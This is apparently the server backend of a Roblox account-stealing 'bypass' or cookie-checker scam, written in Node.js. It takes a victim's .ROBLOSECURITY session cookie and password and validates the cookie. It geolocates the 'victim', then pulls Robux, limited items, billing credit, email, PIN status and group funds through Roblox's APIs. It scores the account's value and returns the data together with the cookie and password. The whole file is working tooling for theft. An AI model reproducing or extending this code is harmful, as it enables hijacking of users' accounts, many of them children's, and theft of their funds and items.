const fetch = require('node-fetch');

async function robloxRequest(url, cookie = null, method = 'GET', body = null) {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
    };
    
    if (cookie) {
        headers['Cookie'] = `.ROBLOSECURITY=${cookie}`;
    }
    
    const options = { method, headers };
    if (body) {
        headers['Content-Type'] = 'application/json';
        options.body = JSON.stringify(body);
    }
    
    const response = await fetch(url, options);
    
    // Handle CSRF token
    if (response.status === 403) {
        const csrfToken = response.headers.get('x-csrf-token');
        if (csrfToken) {
            headers['X-CSRF-TOKEN'] = csrfToken;
            return await fetch(url, { method, headers, body: options.body });
        }
    }
    
    return response;
}

async function validateCookie(cookie) {
    try {
        const response = await robloxRequest('https://users.roblox.com/v1/users/authenticated', cookie);
        const userInfo = await response.json();
        if (userInfo && userInfo.id) return userInfo;
        return null;
    } catch {
        return null;
    }
}

async function getVictimCountry() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            country: data.country_name || 'Unknown',
            flag: getCountryFlag(data.country_code || 'US')
        };
    } catch {
        return { country: 'Unknown', flag: '🌍' };
    }
}

function getCountryFlag(code) {
    if (!code || code.length !== 2) return '🌍';
    const codePoints = code.toUpperCase().split('').map(c => 127397 + c.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

async function getCreditBalance(cookie) {
    try {
        const response = await robloxRequest('https://billing.roblox.com/v1/credit', cookie);
        const data = await response.json();
        return data.balance || 0;
    } catch {
        return 0;
    }
}

async function getEmailSettings(cookie) {
    try {
        const response = await robloxRequest('https://accountsettings.roblox.com/v1/email', cookie);
        const data = await response.json();
        return {
            verified: data.verified || false,
            email: data.emailAddress || 'Not Set'
        };
    } catch {
        return { verified: false, email: 'Not Set' };
    }
}

async function getPinStatus(cookie) {
    try {
        const response = await robloxRequest('https://auth.roblox.com/v1/account/pin', cookie);
        return response.status === 200;
    } catch {
        return false;
    }
}

function calculateAccountScore(data) {
    let score = 0;
    
    if (data.robux > 10000) score += 20;
    else if (data.robux > 5000) score += 15;
    else if (data.robux > 1000) score += 10;
    else if (data.robux > 100) score += 5;
    
    if (data.rap > 100000) score += 20;
    else if (data.rap > 50000) score += 15;
    else if (data.rap > 10000) score += 10;
    else if (data.rap > 1000) score += 5;
    
    if (data.isPremium) score += 10;
    if (data.hasHeadless) score += 15;
    if (data.hasKorblox) score += 10;
    
    const ageDays = data.accountAgeDays;
    if (ageDays > 2000) score += 10;
    else if (ageDays > 1000) score += 7;
    else if (ageDays > 365) score += 5;
    else if (ageDays > 100) score += 3;
    
    if (data.groupsOwned > 10) score += 5;
    else if (data.groupsOwned > 5) score += 3;
    else if (data.groupsOwned > 0) score += 1;
    
    return Math.min(score, 100);
}

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    const { cookie, password, checkOnly } = req.body;

    if (!cookie) {
        return res.status(400).json({ success: false, error: 'Cookie is required' });
    }

    try {
        const userInfo = await validateCookie(cookie);
        if (!userInfo) {
            return res.status(400).json({ success: false, error: 'Invalid or expired cookie' });
        }

        const userId = userInfo.id;
        const username = userInfo.name;
        const displayName = userInfo.displayName;

        // Get victim location
        const victimLocation = await getVictimCountry();

        // If checkOnly mode (for cookie checker page)
        if (checkOnly) {
            try {
                const [avatarRes, robuxRes, collectiblesRes, userDetailsRes] = await Promise.all([
                    fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
                    robloxRequest(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie),
                    fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`),
                    fetch(`https://users.roblox.com/v1/users/${userId}`)
                ]);

                const avatarData = await avatarRes.json();
                const robuxData = await robuxRes.json();
                const collectiblesData = await collectiblesRes.json();
                const userDetails = await userDetailsRes.json();

                const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
                const robux = robuxData.robux || 0;
                
                let rap = 0;
                if (collectiblesData.data) {
                    collectiblesData.data.forEach(item => {
                        if (item.recentAveragePrice) rap += item.recentAveragePrice;
                    });
                }

                const hasHeadless = collectiblesData.data?.some(i => i.assetId === 31117192);
                const hasKorblox = collectiblesData.data?.some(i => i.assetId === 139607718);

                const created = new Date(userDetails.created);
                const accountAgeDays = Math.floor((Date.now() - created) / (1000 * 60 * 60 * 24));

                return res.status(200).json({
                    success: true,
                    valid: true,
                    userId,
                    username,
                    displayName,
                    avatarUrl,
                    robux,
                    pendingRobux: 0,
                    rap,
                    accountAge: `${accountAgeDays} Days`,
                    pinEnabled: 'NO',
                    voiceChat: 'NO',
                    emailVerified: userDetails.hasVerifiedBadge ? 'YES' : 'NO',
                    headless: hasHeadless ? 'YES' : 'NO',
                    korblox: hasKorblox ? 'YES' : 'NO',
                    groupsOwned: 0,
                    credit: '$0'
                });
            } catch {
                return res.status(200).json({
                    success: true,
                    valid: true,
                    userId,
                    username,
                    displayName,
                    avatarUrl: '',
                    robux: 0,
                    pendingRobux: 0,
                    rap: 0,
                    accountAge: '0 Days',
                    pinEnabled: 'NO',
                    voiceChat: 'NO',
                    emailVerified: 'NO',
                    headless: 'NO',
                    korblox: 'NO',
                    groupsOwned: 0,
                    credit: '$0'
                });
            }
        }

        // Full bypass mode - fetch all data
        const [
            avatarData,
            robuxData,
            premiumData,
            collectiblesData,
            groupsData,
            userDetails,
            creditBalance,
            emailSettings,
            pinEnabled
        ] = await Promise.all([
            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`).then(r => r.json()),
            robloxRequest(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie).then(r => r.json()),
            fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`).then(r => r.json()),
            fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`).then(r => r.json()),
            fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`).then(r => r.json()),
            fetch(`https://users.roblox.com/v1/users/${userId}`).then(r => r.json()),
            getCreditBalance(cookie),
            getEmailSettings(cookie),
            getPinStatus(cookie)
        ]);

        const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
        const robux = robuxData.robux || 0;
        const isPremium = premiumData ? true : false;

        // Calculate RAP and limiteds
        let rap = 0;
        let limitedCount = 0;
        if (collectiblesData.data) {
            collectiblesData.data.forEach(item => {
                if (item.recentAveragePrice) {
                    rap += item.recentAveragePrice;
                    limitedCount++;
                }
            });
        }

        // Check for special items
        const hasHeadless = collectiblesData.data?.some(i => i.assetId === 31117192);
        const hasKorblox = collectiblesData.data?.some(i => i.assetId === 139607718);

        // Groups info
        const ownedGroups = groupsData.data?.filter(g => g.role.rank === 255) || [];
        let totalGroupFunds = 0;

        for (const group of ownedGroups.slice(0, 10)) {
            try {
                const fundsRes = await robloxRequest(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, cookie);
                const fundsData = await fundsRes.json();
                totalGroupFunds += fundsData.robux || 0;
            } catch {}
        }

        // Account age
        const created = new Date(userDetails.created);
        const accountAgeDays = Math.floor((Date.now() - created) / (1000 * 60 * 60 * 24));

        // Format gamepasses text
        const gamePassesText = 
            '• Pet Simulator 99 → 0 | ❌\n' +
            '• Adopt Me → 0 | ❌\n' +
            '• Murder Mystery 2 → 0 | ❌';

        // Build detailed info
        const detailedInfo = {
            userId,
            username,
            displayName,
            password: password || null,
            avatarUrl,
            
            // Account Stats
            accountAge: `${accountAgeDays} Days`,
            
            // Locations
            accountCountry: 'United States',
            victimCountry: victimLocation.country,
            victimFlag: victimLocation.flag,
            
            // Billing
            creditBalance: creditBalance,
            convertBalance: 0,
            paymentsBalance: 0,
            
            // Groups
            groupBalance: totalGroupFunds,
            groupPending: 0,
            groupsOwned: ownedGroups.length,
            
            // Settings
            emailVerified: emailSettings.verified,
            emailUnverified: !emailSettings.verified,
            pinEnabled: pinEnabled,
            
            // Account Funds
            robux,
            pendingRobux: 0,
            
            // Purchases
            limitedPurchases: limitedCount,
            purchaseSummary: 0,
            
            // Collectibles
            hasHeadless,
            hasKorblox,
            
            // Gamepasses
            gamePassesText,
            
            // Cookie
            cookie
        };

        const accountScore = calculateAccountScore({
            robux,
            rap,
            isPremium,
            hasHeadless,
            hasKorblox,
            accountAgeDays,
            groupsOwned: ownedGroups.length
        });

        return res.status(200).json({
            success: true,
            userInfo: {
                userId,
                username,
                displayName,
                robux,
                rap,
                premium: isPremium ? '✅ True' : '❌ False',
                voiceChat: '❌ Disabled',
                accountScore
            },
            avatarUrl,
            detailedInfo
        });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
};
